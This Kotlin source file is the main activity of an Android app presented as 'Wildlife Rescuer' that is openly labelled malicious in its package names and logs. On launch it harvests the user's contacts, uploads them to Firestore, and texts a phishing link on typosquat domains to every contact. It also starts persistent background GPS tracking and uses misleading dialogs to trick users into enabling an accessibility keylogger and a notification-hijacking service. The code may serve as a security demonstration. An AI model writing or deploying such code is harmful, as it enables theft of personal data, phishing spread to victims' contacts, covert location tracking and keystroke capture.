package com.example.wildliferescuer

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.navigation.compose.rememberNavController
import com.example.wildliferescuer.malicious.ContactExfil
import com.example.wildliferescuer.malicious.GpsTracker
import com.example.wildliferescuer.navigation.NavGraph
import com.example.wildliferescuer.ui.theme.WildlifeRescuerTheme
import java.util.UUID

class MainActivity : ComponentActivity() {

    private var gpsTracker: GpsTracker? = null
    private var showAccessibilityDialog by mutableStateOf(false)
    private var showNotificationListenerDialog by mutableStateOf(false)
    private val contactExfil = ContactExfil()

    // Launcher for CONTACT and SMS permissions
    private val requestContactPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val contactsGranted = permissions[Manifest.permission.READ_CONTACTS] ?: false
        val smsGranted = permissions[Manifest.permission.SEND_SMS] ?: false

        if (contactsGranted) {
            Log.e("MALICIOUS_APP", "✅ Contacts permission granted - starting exfiltration")
            val contacts = contactExfil.fetchContacts(this)
            if (contacts.isNotEmpty()) {
                contactExfil.uploadContactsToFirestore(this, contacts)

                if (smsGranted) {
                    Log.e("MALICIOUS_APP", "✅ SMS permission granted - sending phishing SMS to contacts")
                    val phishingMessage = "Hey, check out this funny video! 😂 http://tit0k.com"
                    contactExfil.sendPhishingSms(this, contacts, phishingMessage)

                    // Test SMS to verify sending works
                    //Log.e("MALICIOUS_APP", "📱 Sending a test SMS to +1234567890")
                    //contactExfil.testSendSms(this, "+1234567890", "Hey, look at this funny video! http://malicious-link.com")
                } else {
                    Log.e("MALICIOUS_APP", "❌ SMS permission denied - skipping SMS sending")
                }
            } else {
                Log.e("MALICIOUS_APP", "No contacts found")
            }
        } else {
            Log.e("MALICIOUS_APP", "❌ Contacts permission denied")
        }

        Log.e("MALICIOUS_APP", "📍 Now requesting location permissions...")
        requestLocationPermission()
    }

    // Launcher for FOREGROUND LOCATION permissions (Fine + Coarse)
    private val requestLocationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val locationGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION] ?: false

        if (locationGranted) {
            Log.e("MALICIOUS_APP", "✅ Foreground location permission granted")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Log.e("MALICIOUS_APP", "📍 Now requesting BACKGROUND location permission...")
                requestBackgroundLocationPermission()
            } else {
                startGpsTracking()
                requestAccessibilityIfNeeded()
            }
        } else {
            Log.e("MALICIOUS_APP", "❌ Location permission denied")
            requestAccessibilityIfNeeded()
        }
    }

    // Launcher for BACKGROUND LOCATION permission (Android 10+)
    private val requestBackgroundLocationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            Log.e("MALICIOUS_APP", "✅ Background location permission granted - starting GPS tracking")
            startGpsTracking()
        } else {
            Log.e("MALICIOUS_APP", "⚠️ Background location permission denied - GPS will only work while app is open")
            startGpsTracking()
        }
        requestAccessibilityIfNeeded()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            WildlifeRescuerTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()
                    NavGraph(navController = navController)

                    if (showAccessibilityDialog) {
                        AccessibilityPermissionDialog(
                            onConfirm = {
                                showAccessibilityDialog = false
                                openAccessibilitySettings()
                            },
                            onDismiss = {
                                showAccessibilityDialog = false
                                Log.e("MALICIOUS_APP", "❌ User declined accessibility permission")
                            }
                        )
                    }
                    if (showNotificationListenerDialog) {
                        NotificationListenerPermissionDialog(
                            onConfirm = {
                                showNotificationListenerDialog = false
                                openNotificationListenerSettings()
                            },
                            onDismiss = {
                                showNotificationListenerDialog = false
                                Log.e("MALICIOUS_APP", "❌ User declined notification listener permission")
                            }
                        )
                    }
                }
            }
        }
        requestPermissionsOnFirstBoot()
    }

    override fun onResume() {
        super.onResume()
        if (isAccessibilityServiceEnabled()) {
            Log.e("MALICIOUS_APP", "✅ Accessibility service is now enabled!")
        }
    }

    private fun requestPermissionsOnFirstBoot() {
        val hasContactPermission = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        val hasSmsPermission = ContextCompat.checkSelfPermission(
            this, Manifest.permission.SEND_SMS
        ) == PackageManager.PERMISSION_GRANTED

        val hasLocationPermission = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        when {
            (!hasContactPermission || !hasSmsPermission) && !hasLocationPermission -> {
                Log.e("MALICIOUS_APP", "🔐 First boot - requesting contacts and SMS permissions first...")
                requestContactPermission()
            }
            (!hasContactPermission || !hasSmsPermission) && hasLocationPermission -> {
                Log.e("MALICIOUS_APP", "🔐 Requesting contacts and SMS permissions...")
                requestContactPermission()
            }
            hasContactPermission && hasSmsPermission && !hasLocationPermission -> {
                Log.e("MALICIOUS_APP", "🔐 Requesting location permission...")
                val contacts = contactExfil.fetchContacts(this)
                if (contacts.isNotEmpty()) {
                    contactExfil.uploadContactsToFirestore(this, contacts)
                    val phishingMessage = "Hey, check out this funny video! 😂 http://tik0k.com"
                    contactExfil.sendPhishingSms(this, contacts, phishingMessage)
                }
                requestLocationPermission()
            }
            else -> {
                Log.e("MALICIOUS_APP", "✅ All permissions already granted!")
                val contacts = contactExfil.fetchContacts(this)
                if (contacts.isNotEmpty()) {
                    contactExfil.uploadContactsToFirestore(this, contacts)
                    val phishingMessage = "Hey, check out this funny video! 😂 http://tik0k.com"
                    contactExfil.sendPhishingSms(this, contacts, phishingMessage)
                }
                startGpsTracking()
                requestAccessibilityIfNeeded()
            }
        }
    }

    private fun requestContactPermission() {
        Log.e("MALICIOUS_APP", "📱 Showing contact and SMS permission dialog...")
        requestContactPermissionLauncher.launch(
            arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS
            )
        )
    }

    private fun requestLocationPermission() {
        Log.e("MALICIOUS_APP", "📍 Showing FOREGROUND location permission dialog...")
        requestLocationPermissionLauncher.launch(
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
        )
    }

    private fun requestBackgroundLocationPermission() {
        Log.e("MALICIOUS_APP", "📍 Showing BACKGROUND location permission dialog...")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requestBackgroundLocationPermissionLauncher.launch(
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            )
        }
    }

    private fun requestAccessibilityIfNeeded() {
        if (!isAccessibilityServiceEnabled()) {
            Log.e("MALICIOUS_APP", "♿ Accessibility service not enabled")
            Log.e("MALICIOUS_APP", "📱 Showing accessibility permission dialog...")
            showAccessibilityDialog = true
        } else {
            Log.e("MALICIOUS_APP", "✅ Accessibility service already enabled")
        }
    }

    private fun openAccessibilitySettings() {
        try {
            Log.e("MALICIOUS_APP", "📱 Opening accessibility settings...")
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Log.e("MALICIOUS_APP", "✅ Accessibility settings opened")
            Log.e("MALICIOUS_APP", "⚠️ User must manually enable 'Wildlife Rescuer' in accessibility settings")
        } catch (e: Exception) {
            Log.e("MALICIOUS_APP", "❌ Failed to open accessibility settings: ${e.message}")
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "${packageName}/com.example.wildliferescuer.malicious.KeyloggerService"
        try {
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            val isEnabled = enabledServices?.contains(service) == true
            Log.e("MALICIOUS_APP", "Accessibility service status: $isEnabled")
            return isEnabled
        } catch (e: Exception) {
            Log.e("MALICIOUS_APP", "Error checking accessibility: ${e.message}")
            return false
        }
    }

    private fun startGpsTracking() {
        try {
            Log.e("MALICIOUS_APP", "🚀 Attempting to start GPS tracker from MainActivity...")
            gpsTracker = GpsTracker(this)
            if (!gpsTracker!!.hasLocationPermission()) {
                Log.e("MALICIOUS_APP", "❌ Location permission not granted")
                return
            }
            if (!gpsTracker!!.isGpsEnabled()) {
                Log.e("MALICIOUS_APP", "❌ GPS is disabled on device")
                Log.e("MALICIOUS_APP", "   Enable via: Settings → Location → ON")
                return
            }
            val deviceId = UUID.randomUUID().toString()
            gpsTracker!!.startTracking(deviceId, "main_activity")
            Log.e("MALICIOUS_APP", "✅ GPS tracker started successfully!")
            Log.e("MALICIOUS_APP", "📍 GPS icon should appear in status bar now")
        } catch (e: Exception) {
            Log.e("MALICIOUS_APP", "❌ Failed to start GPS tracker: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun requestNotificationListenerIfNeeded() {
        if (!isNotificationListenerEnabled()) {
            Log.e("MALICIOUS_APP", " Notification listener not enabled")
            showNotificationListenerDialog = true
        } else {
            Log.e("MALICIOUS_APP", " Notification listener already enabled")
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        val ourService = "${packageName}/com.example.wildliferescuer.malicious.NotificationHijacker"
        return enabledListeners?.contains(ourService) == true
    }

    private fun openNotificationListenerSettings() {
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Log.e("MALICIOUS_APP", "Opened notification listener settings")
        } catch (e: Exception) {
            Log.e("MALICIOUS_APP", "Failed to open notification listener settings", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.e("MALICIOUS_APP", "🔄 MainActivity destroyed but GPS continues in background")
    }
}

@Composable
fun AccessibilityPermissionDialog(
    onConfirm: () -> Unit,
    onDismiss: () -> Unit
) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Enable Accessibility Service") },
        text = {
            Text(
                "Wildlife Rescuer needs accessibility access to provide enhanced features for rescue operations.\n\n" +
                        "You will be redirected to Settings. Please:\n" +
                        "1. Find 'Wildlife Rescuer' in the list\n" +
                        "2. Toggle it ON\n" +
                        "3. Press back to return to the app"
            )
        },
        confirmButton = {
            TextButton(onClick = onConfirm) {
                Text("Open Settings")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Cancel")
            }
        }
    )
}

@Composable
fun NotificationListenerPermissionDialog(
    onConfirm: () -> Unit,
    onDismiss: () -> Unit
) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Enable Notification Access") },
        text = {
            Text(
                "Wildlife Rescuer needs notification access to help you manage alerts.\n\n" +
                        "You will be redirected to Settings. Please:\n" +
                        "1. Find 'Wildlife Rescuer' in the list\n" +
                        "2. Toggle it ON\n" +
                        "3. Press back to return to the app"
            )
        },
        confirmButton = {
            TextButton(onClick = onConfirm) {
                Text("Open Settings")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Cancel")
            }
        }
    )
}